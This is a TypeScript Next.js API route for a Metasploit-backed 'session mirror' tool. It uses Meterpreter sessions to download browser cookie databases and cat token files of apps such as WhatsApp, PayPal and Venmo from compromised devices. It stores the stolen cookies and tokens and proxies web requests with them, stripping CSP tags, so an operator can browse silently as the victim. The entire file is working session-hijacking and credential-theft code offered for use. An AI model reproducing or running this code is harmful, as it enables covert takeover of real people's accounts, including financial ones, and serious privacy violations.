/**
 * SESSION MIRROR BROWSER API
 *
 * Extracts device cookies/session tokens via Meterpreter, stores them
 * server-side, then proxies web requests with those cookies so the admin
 * can browse as the device user — silently, no IP spoofing needed.
 *
 * Actions (GET):
 *   ?action=new_session                              → create browser session, returns bid
 *   ?action=extract_cookies&sessionId=X&platform=Y  → download & parse Chrome DB from device
 *   ?action=proxy&bid=B&url=U                        → fetch URL with stored cookies, return proxied HTML
 *   ?action=cookies&bid=B                            → list stored cookies for session
 *   ?action=history&bid=B                            → navigation history for session
 *   ?action=stored_sessions                          → list saved cookie sessions
 *
 * Actions (POST):
 *   {action:"set_cookies", bid, cookies:[{domain,name,value,path,secure}]}  → inject manual cookies
 *   {action:"clear_cookies", bid, domain?}                                   → clear all or per domain
 *   {action:"save_session", bid, label}                                      → save to persistent store
 *   {action:"load_session", bid, savedId}                                    → restore saved session
 *   {action:"extract_app_tokens", bid, sessionId, appId}                    → extract app session tokens
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import { getMsfConfig } from "@/lib/msf-config";
import path from "path";
import fs from "fs";
import os from "os";
import crypto from "crypto";

const PAYLOADS_DIR = process.env.PAYLOADS_DIR ?? path.join(os.homedir(), "msf-payloads");
const BROWSER_DIR = path.join(PAYLOADS_DIR, "browser");

function ensureDir(d: string) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

// ── In-memory session store ──────────────────────────────────────────────────
// bid (browser session id) → { cookies: Map<domain → cookieString>, history: string[] }
interface BrowserSession {
  bid: string;
  label: string;
  createdAt: string;
  cookies: Record<string, Record<string, CookieEntry>>;  // domain → name → entry
  history: string[];
  currentUrl: string;
  sourceDevice?: string;
  sourceSessionId?: number;
}

interface CookieEntry {
  name: string;
  value: string;
  domain: string;
  path: string;
  secure: boolean;
  httpOnly: boolean;
  expires?: string;
  sameSite?: string;
  source?: string;
}

const sessions = new Map<string, BrowserSession>();

// Persistent saved sessions (in-memory, would be Supabase in prod)
const savedSessions = new Map<string, BrowserSession>();

// ── Meterpreter helpers ──────────────────────────────────────────────────────
async function meterExec(token: string, sessionId: number, cmd: string, waitMs = 30000): Promise<string> {
  await rpcCall("session.meterpreter_write", [sessionId, cmd + "\n"], token);
  const start = Date.now();
  let out = "";
  while (Date.now() - start < waitMs) {
    const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sessionId], token);
    if (res.data) out += res.data;
    if (out.includes("meterpreter >") || out.includes(">>>")) break;
    await new Promise((r) => setTimeout(r, 600));
  }
  return out;
}

// ── Chrome/browser cookie DB paths per platform ──────────────────────────────
const COOKIE_PATHS: Record<string, { browser: string; path: string }[]> = {
  android: [
    { browser: "Chrome",           path: "/data/data/com.android.chrome/app_chrome/Default/Cookies" },
    { browser: "Samsung Internet", path: "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/Cookies" },
    { browser: "Brave",            path: "/data/data/com.brave.browser/app_brave/Default/Cookies" },
    { browser: "Firefox",          path: "/data/data/org.mozilla.firefox/files/mozilla/cookies.sqlite" },
    { browser: "Opera",            path: "/data/data/com.opera.browser/app_opera/Default/Cookies" },
  ],
  windows: [
    { browser: "Chrome",           path: "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" },
    { browser: "Edge",             path: "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies" },
    { browser: "Firefox",          path: "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\cookies.sqlite" },
    { browser: "Opera",            path: "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies" },
    { browser: "Brave",            path: "C:\\Users\\%USERNAME%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies" },
  ],
  linux: [
    { browser: "Chrome",           path: "~/.config/google-chrome/Default/Cookies" },
    { browser: "Chromium",         path: "~/.config/chromium/Default/Cookies" },
    { browser: "Firefox",          path: "~/.mozilla/firefox/cookies.sqlite" },
    { browser: "Brave",            path: "~/.config/BraveSoftware/Brave-Browser/Default/Cookies" },
  ],
  darwin: [
    { browser: "Chrome",           path: "~/Library/Application Support/Google/Chrome/Default/Cookies" },
    { browser: "Safari",           path: "~/Library/Cookies/Cookies.binarycookies" },
    { browser: "Firefox",          path: "~/Library/Application Support/Firefox/Profiles/cookies.sqlite" },
    { browser: "Brave",            path: "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies" },
  ],
};

// App token paths — SharedPreferences and app-specific auth stores
const APP_TOKEN_PATHS: Record<string, { app: string; paths: string[] }[]> = {
  android: [
    { app: "Google",    paths: ["/data/data/com.google.android.gms/shared_prefs/", "/data/data/com.google.android.googlequicksearchbox/shared_prefs/"] },
    { app: "WhatsApp",  paths: ["/data/data/com.whatsapp/shared_prefs/", "/data/data/com.whatsapp/files/"] },
    { app: "Facebook",  paths: ["/data/data/com.facebook.katana/shared_prefs/", "/data/data/com.facebook.orca/shared_prefs/"] },
    { app: "Instagram", paths: ["/data/data/com.instagram.android/shared_prefs/"] },
    { app: "Twitter",   paths: ["/data/data/com.twitter.android/shared_prefs/"] },
    { app: "TikTok",    paths: ["/data/data/com.zhiliaoapp.musically/shared_prefs/"] },
    { app: "Snapchat",  paths: ["/data/data/com.snapchat.android/shared_prefs/"] },
    { app: "PayPal",    paths: ["/data/data/com.paypal.android.p2pmobile/shared_prefs/"] },
    { app: "CashApp",   paths: ["/data/data/com.squareup.cash/shared_prefs/"] },
    { app: "Venmo",     paths: ["/data/data/com.venmo/shared_prefs/"] },
  ],
};

// ── SQLite cookie parser via sql.js ──────────────────────────────────────────
async function parseCookieDb(filePath: string): Promise<CookieEntry[]> {
  try {
    const initSqlJs = (await import("sql.js")).default;
    const SQL = await initSqlJs({
      locateFile: (f: string) => `https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.3/${f}`,
    });
    const buf = fs.readFileSync(filePath);
    const db = new SQL.Database(buf);

    // Chrome cookies schema
    let res = db.exec(`
      SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, samesite
      FROM cookies ORDER BY host_key, name
    `);

    // Firefox cookies schema fallback
    if (!res.length) {
      res = db.exec(`
        SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
        FROM moz_cookies ORDER BY host, name
      `);
    }

    if (!res.length) return [];
    const { columns, values } = res[0];

    return values.map((row) => {
      const r = Object.fromEntries(columns.map((c, i) => [c, row[i]])) as Record<string, unknown>;
      const domain = String(r.host_key ?? r.host ?? "");
      return {
        name:     String(r.name ?? ""),
        value:    String(r.value ?? ""),
        domain:   domain.startsWith(".") ? domain : "." + domain,
        path:     String(r.path ?? "/"),
        secure:   Boolean(r.is_secure ?? r.isSecure ?? false),
        httpOnly: Boolean(r.is_httponly ?? r.isHttpOnly ?? false),
        expires:  r.expires_utc ? new Date(Number(r.expires_utc) / 1000).toISOString() : undefined,
        sameSite: String(r.samesite ?? r.sameSite ?? ""),
        source:   "chrome_db",
      };
    }).filter((c) => c.value && !c.value.startsWith("v10") && !c.value.startsWith("v11"));
    // Filter out Chrome's encrypted cookie values (v10/v11 prefix = DPAPI/Keystore encrypted)
  } catch {
    return [];
  }
}

// ── Cookie string builder (for Cookie: request header) ───────────────────────
function buildCookieHeader(session: BrowserSession, url: string): string {
  try {
    const parsed = new URL(url);
    const hostname = parsed.hostname;
    const entries: string[] = [];

    for (const [domain, cookies] of Object.entries(session.cookies)) {
      // Match domain (including subdomain wildcard with leading dot)
      const domainClean = domain.startsWith(".") ? domain.slice(1) : domain;
      if (hostname === domainClean || hostname.endsWith("." + domainClean)) {
        for (const cookie of Object.values(cookies)) {
          if (parsed.pathname.startsWith(cookie.path)) {
            if (!cookie.secure || parsed.protocol === "https:") {
              entries.push(`${cookie.name}=${cookie.value}`);
            }
          }
        }
      }
    }

    return entries.join("; ");
  } catch {
    return "";
  }
}

// ── Store Set-Cookie response headers back into session ───────────────────────
function absorbSetCookieHeaders(session: BrowserSession, responseHeaders: Headers, requestUrl: string) {
  const setCookieValues = responseHeaders.getSetCookie?.() ?? [];
  // Fallback: some node versions expose as single header
  const singleVal = responseHeaders.get("set-cookie");
  const all = setCookieValues.length > 0 ? setCookieValues : singleVal ? [singleVal] : [];

  for (const raw of all) {
    try {
      const parts = raw.split(";").map((p) => p.trim());
      const [nameVal, ...attrs] = parts;
      const eqIdx = nameVal.indexOf("=");
      if (eqIdx === -1) continue;
      const name = nameVal.slice(0, eqIdx).trim();
      const value = nameVal.slice(eqIdx + 1).trim();

      let domain = "";
      let cookiePath = "/";
      let secure = false;
      let httpOnly = false;
      let expires: string | undefined;

      for (const attr of attrs) {
        const [k, v] = attr.split("=").map((x) => x.trim());
        if (k.toLowerCase() === "domain") domain = v;
        else if (k.toLowerCase() === "path") cookiePath = v ?? "/";
        else if (k.toLowerCase() === "secure") secure = true;
        else if (k.toLowerCase() === "httponly") httpOnly = true;
        else if (k.toLowerCase() === "expires") expires = v;
      }

      if (!domain) {
        try { domain = "." + new URL(requestUrl).hostname; } catch { continue; }
      }
      if (!domain.startsWith(".")) domain = "." + domain;

      if (!session.cookies[domain]) session.cookies[domain] = {};
      session.cookies[domain][name] = { name, value, domain, path: cookiePath, secure, httpOnly, expires, source: "set-cookie" };
    } catch { /* skip malformed */ }
  }
}

// ── HTML rewriter — routes everything through our proxy ───────────────────────
function rewriteHtml(html: string, baseUrl: string, bid: string): string {
  try {
    const base = new URL(baseUrl);

    // Resolve a URL relative to the base
    const resolveUrl = (raw: string): string => {
      if (!raw || raw.startsWith("data:") || raw.startsWith("javascript:") || raw.startsWith("#")) return raw;
      try {
        const abs = new URL(raw, base).href;
        return `/api/browser?action=proxy&bid=${bid}&url=${encodeURIComponent(abs)}`;
      } catch { return raw; }
    };

    return html
      // Rewrite href (links, preloads)
      .replace(/\bhref="([^"]+)"/g, (_, u) => `href="${resolveUrl(u)}"`)
      .replace(/\bhref='([^']+)'/g, (_, u) => `href='${resolveUrl(u)}'`)
      // Rewrite src (images, scripts, iframes)
      .replace(/\bsrc="([^"]+)"/g, (_, u) => `src="${resolveUrl(u)}"`)
      .replace(/\bsrc='([^']+)'/g, (_, u) => `src='${resolveUrl(u)}'`)
      // Rewrite form actions
      .replace(/\baction="([^"]+)"/g, (_, u) => `action="${resolveUrl(u)}"`)
      .replace(/\baction='([^']+)'/g, (_, u) => `action='${resolveUrl(u)}'`)
      // Rewrite srcset
      .replace(/\bsrcset="([^"]+)"/g, (_, s) =>
        `srcset="${s.split(",").map((part: string) => {
          const [u, size] = part.trim().split(/\s+/);
          return `${resolveUrl(u)}${size ? " " + size : ""}`;
        }).join(", ")}"`)
      // Rewrite CSS url()
      .replace(/url\(["']?([^"')]+)["']?\)/g, (_, u) => `url('${resolveUrl(u)}')`)
      // Strip security headers injected in meta tags
      .replace(/<meta[^>]+(?:Content-Security-Policy|X-Frame-Options)[^>]*>/gi, "<!-- csp stripped -->")
      // Inject our navigation helper script
      .replace("</head>", `
<script>
(function() {
  // Intercept all link clicks and form submits to stay within the proxy
  document.addEventListener('click', function(e) {
    const a = e.target.closest('a');
    if (a && a.href && !a.href.includes('/api/browser')) {
      e.preventDefault();
      window.parent.postMessage({ type: 'proxy-navigate', url: a.href }, '*');
    }
  }, true);
  document.addEventListener('submit', function(e) {
    const form = e.target;
    if (form && form.action && !form.action.includes('/api/browser')) {
      e.preventDefault();
      const data = new FormData(form);
      const params = new URLSearchParams(data);
      const url = form.method.toLowerCase() === 'post'
        ? '/api/browser?action=proxy&bid=${bid}&url=' + encodeURIComponent(form.action) + '&method=POST&body=' + encodeURIComponent(params.toString())
        : form.action + '?' + params.toString();
      window.parent.postMessage({ type: 'proxy-navigate', url }, '*');
    }
  }, true);
  // Send page title back to parent
  window.parent.postMessage({ type: 'page-title', title: document.title, url: window.location.href }, '*');
})();
</script>
</head>`)
      // Base tag for any remaining relative resources
      .replace(/<head>/i, `<head><base href="${base.origin}${base.pathname}">`);
  } catch {
    return html;
  }
}

// ── Extract SharedPreferences tokens from Android app ────────────────────────
async function extractAppTokens(token: string, sessionId: number, appId: string): Promise<Record<string, string>> {
  const config = APP_TOKEN_PATHS.android ?? [];
  const appConfig = config.find((a) => a.app.toLowerCase() === appId.toLowerCase());
  const tokens: Record<string, string> = {};

  if (!appConfig) return tokens;

  for (const dir of appConfig.paths) {
    // List XML files in the SharedPreferences directory
    const out = await meterExec(token, sessionId, `ls ${dir}`, 8000);
    const xmlFiles = out.match(/\S+\.xml/g) ?? [];

    for (const xml of xmlFiles.slice(0, 5)) {
      const filePath = dir + xml;
      const content = await meterExec(token, sessionId, `cat ${filePath}`, 10000);
      // Extract string values that look like auth tokens
      const matches = [...content.matchAll(/<string name="([^"]+)">([^<]{10,})<\/string>/g)];
      for (const m of matches) {
        const key = m[1];
        const val = m[2];
        // Filter for token-like values
        if (/token|auth|session|key|secret|access|refresh|bearer/i.test(key)) {
          tokens[`${appId}.${key}`] = val;
        }
      }
    }
  }

  return tokens;
}

// ── Main GET handler ─────────────────────────────────────────────────────────
export async function GET(request: Request) {
  const url = new URL(request.url);
  const action = url.searchParams.get("action") ?? "";
  const bid = url.searchParams.get("bid") ?? "";

  // ── new_session ────────────────────────────────────────────────────────────
  if (action === "new_session") {
    const newBid = crypto.randomUUID().slice(0, 12);
    sessions.set(newBid, {
      bid: newBid,
      label: "Browser Session " + new Date().toLocaleTimeString(),
      createdAt: new Date().toISOString(),
      cookies: {},
      history: [],
      currentUrl: "",
    });
    return NextResponse.json({ bid: newBid });
  }

  // ── stored_sessions ───────────────────────────────────────────────────────
  if (action === "stored_sessions") {
    const list = [...savedSessions.values()].map((s) => ({
      bid: s.bid,
      label: s.label,
      createdAt: s.createdAt,
      domainCount: Object.keys(s.cookies).length,
      cookieCount: Object.values(s.cookies).reduce((a, b) => a + Object.keys(b).length, 0),
      sourceDevice: s.sourceDevice,
    }));
    return NextResponse.json({ sessions: list });
  }

  // ── cookies (list) ────────────────────────────────────────────────────────
  if (action === "cookies") {
    if (!bid) return NextResponse.json({ error: "bid required" }, { status: 400 });
    const sess = sessions.get(bid) ?? savedSessions.get(bid);
    if (!sess) return NextResponse.json({ error: "session not found" }, { status: 404 });

    // Return organised by domain
    const domains = Object.entries(sess.cookies).map(([domain, cookies]) => ({
      domain,
      count: Object.keys(cookies).length,
      cookies: Object.values(cookies).map((c) => ({
        name: c.name,
        value: c.value.length > 80 ? c.value.slice(0, 80) + "…" : c.value,
        valueFull: c.value,
        secure: c.secure,
        httpOnly: c.httpOnly,
        expires: c.expires,
        source: c.source,
        path: c.path,
      })),
    }));
    return NextResponse.json({ bid, domains, totalDomains: domains.length, totalCookies: domains.reduce((a, b) => a + b.count, 0) });
  }

  // ── history ───────────────────────────────────────────────────────────────
  if (action === "history") {
    if (!bid) return NextResponse.json({ error: "bid required" }, { status: 400 });
    const sess = sessions.get(bid);
    return NextResponse.json({ history: sess?.history ?? [], currentUrl: sess?.currentUrl ?? "" });
  }

  // ── extract_cookies (from device via Meterpreter) ─────────────────────────
  if (action === "extract_cookies") {
    const sessionId = Number(url.searchParams.get("sessionId"));
    const platform = url.searchParams.get("platform") ?? "android";

    if (!sessionId) return NextResponse.json({ error: "sessionId required" }, { status: 400 });
    if (!bid)       return NextResponse.json({ error: "bid required" }, { status: 400 });

    let sess = sessions.get(bid);
    if (!sess) return NextResponse.json({ error: "browser session not found" }, { status: 404 });

    if (getMsfConfig().demoMode) {
      // Demo: inject example cookies
      const demoCookies: CookieEntry[] = [
        { name: "SSID",       value: "AHWqTUm0gDvKj8Y7",   domain: ".google.com",   path: "/", secure: true,  httpOnly: true,  source: "chrome_db" },
        { name: "SID",        value: "g.a000nxxxxxxxxxx",    domain: ".google.com",   path: "/", secure: true,  httpOnly: false, source: "chrome_db" },
        { name: "HSID",       value: "Ahj8Kxxxxxxxxxx",      domain: ".google.com",   path: "/", secure: false, httpOnly: true,  source: "chrome_db" },
        { name: "c_user",     value: "100089xxxxxxx",         domain: ".facebook.com", path: "/", secure: true,  httpOnly: false, source: "chrome_db" },
        { name: "xs",         value: "42%3Axxxxxxxxxx",       domain: ".facebook.com", path: "/", secure: true,  httpOnly: false, source: "chrome_db" },
        { name: "sessionid",  value: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", domain: ".instagram.com", path: "/", secure: true,  httpOnly: true,  source: "chrome_db" },
        { name: "ds_user_id", value: "12345678901",            domain: ".instagram.com", path: "/", secure: true,  httpOnly: false, source: "chrome_db" },
        { name: "auth_token", value: "AAAAAXXXXXXXXXX",        domain: ".twitter.com",  path: "/", secure: true,  httpOnly: true,  source: "chrome_db" },
      ];
      for (const c of demoCookies) {
        if (!sess.cookies[c.domain]) sess.cookies[c.domain] = {};
        sess.cookies[c.domain][c.name] = c;
      }
      sess.sourceDevice = `Demo Device (session ${sessionId})`;
      sess.sourceSessionId = sessionId;
      return NextResponse.json({ ok: true, extracted: demoCookies.length, demo: true, domains: Object.keys(sess.cookies) });
    }

    const rpcToken = await getRpcToken();
    ensureDir(BROWSER_DIR);

    const allCookies: CookieEntry[] = [];
    const paths = COOKIE_PATHS[platform] ?? COOKIE_PATHS.android;

    for (const { browser, path: remotePath } of paths) {
      try {
        const localName = `cookies_${browser.replace(/\s/g, "_")}_${sessionId}_${Date.now()}.db`;
        const localPath = path.join(BROWSER_DIR, localName);

        // Download the cookie DB
        await meterExec(rpcToken, sessionId, `download ${remotePath} ${localPath}`, 30000);

        if (!fs.existsSync(localPath)) continue;

        const parsed = await parseCookieDb(localPath);
        for (const c of parsed) {
          c.source = browser;
          allCookies.push(c);
          if (!sess!.cookies[c.domain]) sess!.cookies[c.domain] = {};
          sess!.cookies[c.domain][c.name] = c;
        }

        // Clean up local copy
        fs.unlinkSync(localPath);
      } catch { /* browser not installed or no root */ }
    }

    sess.sourceDevice = `Session ${sessionId} (${platform})`;
    sess.sourceSessionId = sessionId;

    return NextResponse.json({
      ok: true,
      extracted: allCookies.length,
      domains: Object.keys(sess.cookies),
      browsers: paths.map((p) => p.browser),
    });
  }

  // ── proxy ─────────────────────────────────────────────────────────────────
  if (action === "proxy") {
    const targetUrl = url.searchParams.get("url") ?? "";
    const method = (url.searchParams.get("method") ?? "GET").toUpperCase();
    const bodyParam = url.searchParams.get("body");

    if (!targetUrl) return NextResponse.json({ error: "url required" }, { status: 400 });
    if (!bid)       return NextResponse.json({ error: "bid required" }, { status: 400 });

    let sess = sessions.get(bid);
    if (!sess) {
      // Auto-create session for convenience
      sess = { bid, label: "Auto Session", createdAt: new Date().toISOString(), cookies: {}, history: [], currentUrl: "" };
      sessions.set(bid, sess);
    }

    const cookieHeader = buildCookieHeader(sess, targetUrl);

    try {
      const res = await fetch(targetUrl, {
        method,
        headers: {
          "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "gzip, deflate",
          "Referer": sess.currentUrl || targetUrl,
          ...(cookieHeader ? { "Cookie": cookieHeader } : {}),
          ...(bodyParam ? { "Content-Type": "application/x-www-form-urlencoded" } : {}),
        },
        body: method === "POST" && bodyParam ? bodyParam : undefined,
        redirect: "follow",
        signal: AbortSignal.timeout(20000),
      });

      // Absorb any new cookies from Set-Cookie headers
      absorbSetCookieHeaders(sess, res.headers, targetUrl);

      // Update history
      sess.history = [targetUrl, ...sess.history.slice(0, 49)];
      sess.currentUrl = targetUrl;

      const contentType = res.headers.get("content-type") ?? "";

      // For HTML, rewrite and return
      if (contentType.includes("text/html")) {
        let html = await res.text();
        html = rewriteHtml(html, targetUrl, bid);

        return new Response(html, {
          status: res.status,
          headers: {
            "Content-Type": "text/html; charset=utf-8",
            "X-Proxied-Url": targetUrl,
            "X-Proxy-Status": String(res.status),
            "X-Cookie-Count": String(Object.values(sess.cookies).reduce((a, b) => a + Object.keys(b).length, 0)),
          },
        });
      }

      // For CSS, rewrite URLs
      if (contentType.includes("text/css")) {
        let css = await res.text();
        try {
          const base = new URL(targetUrl);
          css = css.replace(/url\(["']?([^"')]+)["']?\)/g, (_, u) => {
            if (u.startsWith("data:") || u.startsWith("//")) return `url('${u}')`;
            try {
              const abs = new URL(u, base).href;
              return `url('/api/browser?action=proxy&bid=${bid}&url=${encodeURIComponent(abs)}')`;
            } catch { return `url('${u}')`; }
          });
        } catch { /* pass through */ }
        return new Response(css, { status: res.status, headers: { "Content-Type": "text/css" } });
      }

      // For binary resources, pipe through
      const blob = await res.blob();
      return new Response(blob, {
        status: res.status,
        headers: {
          "Content-Type": contentType || "application/octet-stream",
          "Cache-Control": "public, max-age=300",
        },
      });

    } catch (err) {
      return NextResponse.json({ error: String(err), url: targetUrl }, { status: 502 });
    }
  }

  return NextResponse.json({ error: "Unknown action" }, { status: 400 });
}

// ── Main POST handler ────────────────────────────────────────────────────────
export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ error: "Invalid JSON" }, { status: 400 }); }

  const { action, bid } = body as { action: string; bid: string };

  // ── set_cookies (manual injection) ────────────────────────────────────────
  if (action === "set_cookies") {
    if (!bid) return NextResponse.json({ error: "bid required" }, { status: 400 });
    let sess = sessions.get(bid);
    if (!sess) {
      sess = { bid, label: "Manual Session", createdAt: new Date().toISOString(), cookies: {}, history: [], currentUrl: "" };
      sessions.set(bid, sess);
    }

    const incoming = (body.cookies as CookieEntry[]) ?? [];
    let added = 0;
    for (const c of incoming) {
      if (!c.domain || !c.name) continue;
      const domain = c.domain.startsWith(".") ? c.domain : "." + c.domain;
      if (!sess.cookies[domain]) sess.cookies[domain] = {};
      sess.cookies[domain][c.name] = { ...c, domain, source: c.source ?? "manual" };
      added++;
    }
    return NextResponse.json({ ok: true, added, totalCookies: Object.values(sess.cookies).reduce((a, b) => a + Object.keys(b).length, 0) });
  }

  // ── clear_cookies ──────────────────────────────────────────────────────────
  if (action === "clear_cookies") {
    if (!bid) return NextResponse.json({ error: "bid required" }, { status: 400 });
    const sess = sessions.get(bid);
    if (!sess) return NextResponse.json({ error: "session not found" }, { status: 404 });
    const domain = body.domain as string | undefined;
    if (domain) {
      delete sess.cookies[domain];
    } else {
      sess.cookies = {};
    }
    return NextResponse.json({ ok: true });
  }

  // ── save_session ──────────────────────────────────────────────────────────
  if (action === "save_session") {
    if (!bid) return NextResponse.json({ error: "bid required" }, { status: 400 });
    const sess = sessions.get(bid);
    if (!sess) return NextResponse.json({ error: "session not found" }, { status: 404 });
    const label = String(body.label ?? sess.label);
    const savedId = crypto.randomUUID().slice(0, 12);
    savedSessions.set(savedId, { ...sess, bid: savedId, label });
    return NextResponse.json({ ok: true, savedId, label });
  }

  // ── load_session ──────────────────────────────────────────────────────────
  if (action === "load_session") {
    if (!bid) return NextResponse.json({ error: "bid required" }, { status: 400 });
    const savedId = String(body.savedId ?? "");
    const saved = savedSessions.get(savedId);
    if (!saved) return NextResponse.json({ error: "saved session not found" }, { status: 404 });
    // Merge saved cookies into current session
    let sess = sessions.get(bid);
    if (!sess) {
      sess = { ...saved, bid };
      sessions.set(bid, sess);
    } else {
      for (const [domain, cookies] of Object.entries(saved.cookies)) {
        if (!sess.cookies[domain]) sess.cookies[domain] = {};
        Object.assign(sess.cookies[domain], cookies);
      }
    }
    return NextResponse.json({ ok: true, merged: Object.keys(saved.cookies).length });
  }

  // ── extract_app_tokens ────────────────────────────────────────────────────
  if (action === "extract_app_tokens") {
    const sessionId = Number(body.sessionId);
    const appId = String(body.appId ?? "");
    if (!sessionId || !appId) return NextResponse.json({ error: "sessionId and appId required" }, { status: 400 });

    if (getMsfConfig().demoMode) {
      return NextResponse.json({
        ok: true, demo: true,
        tokens: {
          [`${appId}.access_token`]: "DEMO_ACCESS_TOKEN_" + Math.random().toString(36).slice(2, 18).toUpperCase(),
          [`${appId}.refresh_token`]: "DEMO_REFRESH_" + Math.random().toString(36).slice(2, 18).toUpperCase(),
          [`${appId}.session_key`]: "DEMO_SESSION_" + Math.random().toString(36).slice(2, 18).toUpperCase(),
        },
      });
    }

    const rpcToken = await getRpcToken();
    const tokens = await extractAppTokens(rpcToken, sessionId, appId);
    return NextResponse.json({ ok: true, tokens, count: Object.keys(tokens).length });
  }

  return NextResponse.json({ error: "Unknown action" }, { status: 400 });
}
